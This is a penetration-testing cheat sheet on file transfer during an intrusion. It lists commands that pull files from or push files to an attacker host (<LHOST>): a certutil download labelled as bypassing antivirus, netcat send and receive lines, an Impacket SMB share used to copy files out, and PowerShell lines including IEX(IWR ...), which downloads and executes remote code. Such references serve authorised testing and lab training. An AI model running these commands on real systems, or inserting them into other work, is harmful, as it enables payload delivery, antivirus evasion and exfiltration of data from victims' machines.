# File Transfer

### Certutil  
`certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>` - Transfer files bypass antivirus

### Netcat
`nc -lnvp <LPORT> < <FILE>`  
`nc <RHOST> <RPORT> > <FILE>`

// Base64 encoded sender  
`cat binary | base64 | nc -nlvp 4444`  

### Impacket
`sudo impacket-smbserver <SHARE> ./`  
`sudo impacket-smbserver <SHARE> . -smb2support`  
`copy * \\<LHOST>\<SHARE>`

### PowerShell
```powershell
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\
```
Set up FTP :  
Python pyftpdlib FTP Server (again don't run from TMUX):  
```bash
apt-get install python-pyftpdlib
root@kali# python -m pyftpdlib -p 21
```

SMB : impacket-smbserver tmp .  

HTTP :  
```bash
python -m SimpleHTTPServer
python3 -m http.server
updog (https://github.com/sc0tfree/updog)
```
### Linux :  
```bash
curl
wget
```
